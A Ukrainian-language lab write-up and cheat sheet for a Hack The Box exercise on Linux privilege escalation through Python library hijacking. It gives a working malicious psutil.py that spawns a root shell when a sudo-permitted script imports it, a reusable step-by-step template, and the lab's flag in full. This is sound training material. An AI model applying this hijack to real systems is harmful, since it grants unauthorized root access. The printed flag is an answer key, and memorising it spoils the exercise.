## Python Library Hijacking

Тема уроку:
- **Python Library Hijacking** у контексті Linux Privilege Escalation.

Ціль:
- Використати те, що `sudo` дозволяє запускати `python3`-скрипт, який імпортує модуль `psutil`.
- Підмінити модуль `psutil` у шляху імпорту, щоб замість справжньої бібліотеки виконати свій код і отримати root. [rastating.github](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

***

### 1. Вихідні умови (завдання HTB)

На цілі:

```bash
ls
# mem_status.py

sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

cat mem_status.py
```

```python
#!/usr/bin/env python3
import psutil 

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Ключові моменти:

- `sudo` дозволяє **без пароля** виконувати `python3 mem_status.py`.
- Скрипт імпортує `psutil`, тобто Python спробує знайти модуль `psutil` у стандартному шляху імпорту та в поточному каталозі. [linkedin](https://www.linkedin.com/pulse/various-options-privilege-escalation-via-python-library-budilov)

***

### 2. Хід експлуатації (як ти зробив)

1. Створив свій `psutil.py` поруч зі скриптом:

   ```bash
   cat > psutil.py << 'EOF'
   import os

   def virtual_memory():
       # Отримаємо root-шелл
       os.system("/bin/bash")
   EOF
   ```

   - Твій модуль визначає ту ж функцію `virtual_memory()`, але замість повернення структури пам’яті викликає `/bin/bash`. [0xss0rz.gitbook](https://0xss0rz.gitbook.io/0xss0rz/pentest/privilege-escalation/linux/python-library-hijacking)
   - Оскільки `mem_status.py` лежить у `/home/htb-student`, а ти створив `psutil.py` у тій же директорії, Python при `import psutil` знаходить **твій** модуль першим.

2. Запускаєш скрипт через sudo:

   ```bash
   sudo /usr/bin/python3 /home/htb-student/mem_status.py
   ```

   У результаті:

   ```bash
   root@ubuntu:/home/htb-student# whoami
   # root
   ```

   - `sudo` запускає `python3` з правами root.
   - `import psutil` підтягує твій `psutil.py`.
   - Виклик `psutil.virtual_memory()` виконує `os.system("/bin/bash")`, відкриваючи root-шелл. [notes.dollarboysushil](https://notes.dollarboysushil.com/linux-privilege-escalation/python-library-hijacking)

***

### 3. Пошук і читання флагу

У root-шеллі:

```bash
root@ubuntu:/home/htb-student# find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
/root/flag.txt

root@ubuntu:/home/htb-student# cd /root
root@ubuntu:~# cat flag.txt
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```

Флаг:

> `HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}`

***

### 4. Шпаргалка: Python Library Hijacking (цей модуль)

**Тема уроку**

Python Library Hijacking – підміна Python-модулів, які імпортує скрипт, що запускається з підвищеними правами.

**Ціль**

- Навчитися:
  - читати `sudo -l` і знаходити записи типу `NOPASSWD: /usr/bin/python3 /path/script.py`; [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)
  - дивитися, які модулі імпортує скрипт;
  - зрозуміти, які шляхи імпорту (поточна директорія, `site-packages`, тощо) є **записуваними**; [hacktricks](https://hacktricks.wiki/uk/linux-hardening/privilege-escalation/index.html)
  - створити/перезаписати модуль з потрібним ім’ям (`psutil.py`) і вставити в нього код, який дає root-шелл.

**Питання**

- Як знайти Python-скрипти, що запускаються через `sudo`?
- Як дізнатися, які модулі імпортує скрипт?
- Які каталоги в `sys.path` мають права запису для поточного користувача?
- Як безпечно написати мінімальний малишіозний модуль для прівеску (наприклад, функція, яку точно викликає скрипт)? [github](https://github.com/kabaneridev/pt-notes/blob/main/CPTS-PREP/linux-priv-esc/python-library-hijacking.md)
- Як після прівеску швидко знайти `flag.txt` (наприклад, у `/root`)?

**Кроки (швидкий шаблон)**

1. Перевірити `sudo -l`:

   ```bash
   sudo -l
   ```

2. Прочитати скрипт:

   ```bash
   cat /home/htb-student/mem_status.py
   ```

3. Створити модуль з тим самим ім’ям, що імпортується:

   ```bash
   cat > psutil.py << 'EOF'
   import os
   def virtual_memory():
       os.system("/bin/bash")
   EOF
   ```

4. Запустити скрипт через sudo:

   ```bash
   sudo /usr/bin/python3 /home/htb-student/mem_status.py
   ```

5. Як root знайти флаг:

   ```bash
   find /root -maxdepth 3 -name "flag.txt" 2>/dev/null
   cd /root
   cat flag.txt
   ```
